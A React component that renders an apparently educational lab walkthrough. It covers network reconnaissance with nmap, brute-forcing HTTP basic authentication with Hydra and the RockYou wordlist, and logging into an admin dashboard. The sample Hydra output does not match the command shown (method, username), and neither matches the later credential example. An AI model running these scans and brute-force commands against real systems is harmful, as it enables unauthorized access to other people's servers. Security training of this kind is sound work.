// src/pages/BruteAndLootInstructions.tsx

import React from 'react';

const BruteAndLootInstructions: React.FC = () => {
  return (
    <div>
      <h2>Brute & Loot: Exploiting HTTP Basic Authentication</h2>
      <pre style={{ whiteSpace: 'pre-wrap', wordWrap: 'break-word' }}>
        {`Scenario:
A web server protected by HTTP basic authentication has been identified during a reconnaissance scan. Your goal is to brute-force the login credentials and access the restricted area of the server. Using Hydra and the RockYou wordlist, you'll simulate an attack to reveal weak passwords and gain access.

Steps to Complete the Challenge:

1. Reconnaissance
   Perform reconnaissance from your attacker machine to identify live hosts and open HTTP services.

   Determine your subnet: This helps identify the range of IP addresses to scan for live hosts.

   \`\`\`bash
   ip a
   \`\`\`

   Look for the inet line under the eth0 network interface, for example:

   \`\`\`
   inet 192.168.1.100/24
   \`\`\`

   Scan for live hosts in the subnet: Use nmap to identify reachable devices in the network.

   \`\`\`bash
   nmap -sn 192.168.1.0/24
   \`\`\`

   Example output:

   \`\`\`
   Nmap scan report for 192.168.1.10
   Host is up (0.0010s latency).
   \`\`\`

   Check other similar IP addresses: Look for devices with IP addresses similar to your attacker machine’s IP (e.g., 192.168.1.x). These could be potential targets.

   Scan for HTTP services: Use nmap to check if web services (ports 80 and 443) are running on a specific target.

   \`\`\`bash
   nmap -p80,443 <target_ip>
   \`\`\`

   Example output:

   \`\`\`
   PORT   STATE SERVICE
   80/tcp open  http
   443/tcp open  https
   \`\`\`

   Note the IP address of the machine with HTTP services—this will be your target.

2. Confirm HTTP Basic Authentication
   Access the web server using your browser. If prompted for a username and password, this confirms that the server is protected by HTTP basic authentication.

3. Brute-Force HTTP Basic Authentication
   Use Hydra to brute-force login credentials. Hydra systematically tests username and password combinations from a wordlist to find valid credentials.

   \`\`\`bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://<target_ip>
   \`\`\`

   - \`-l admin\`: Specifies the username to test (e.g., admin).
   - \`-P /usr/share/wordlists/rockyou.txt\`: Specifies the wordlist file containing potential passwords.
   - \`http-get://<target_ip>\`: Specifies the target protocol (HTTP GET) and the URL to attack.

   Review Hydra’s output: Once Hydra finds valid credentials, the success message will appear:

   \`\`\`
   [80][http-post-form] host: <target_ip> login: Andy password: P@S24DGWo0rd
   \`\`\`

4. Access the Restricted Area
   Once valid credentials are found, access the restricted area using a web browser.

   - Open a new tab in Firefox
   - Enter the target URL: Replace \`192.168.1.5\` with the target IP address.

     \`\`\`
     http://192.168.1.5
     \`\`\`

   - Provide the credentials: Enter the cracked username and password (e.g., admin and password123).

   Once logged in, you should see the restricted admin dashboard. Example output:

   \`\`\`
   Admin Dashboard - Internal Use Only
   \`\`\`

   Find the Sensitive Data: Explore the admin dashboard for files, document findings, and analyze potential vulnerabilities.
        `}
      </pre>
    </div>
  );
};

export default BruteAndLootInstructions;
